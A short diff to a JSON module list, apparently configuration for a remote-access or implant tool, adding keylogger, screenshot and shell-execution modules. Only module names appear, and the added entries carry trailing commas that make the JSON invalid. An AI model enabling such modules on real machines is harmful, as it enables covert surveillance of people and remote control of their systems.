@@ -4,5 +4,15 @@
     },
     {
         "module" : "modules.environment"
+    },
+    {
+        "module" : "modules.tig_keylogger",
+    },
+    {
+        "module" : "modules.tig_screenshot",
+    },
+    {
+        "module" : "modules.tig_shell_exec",
     }
+
 ]
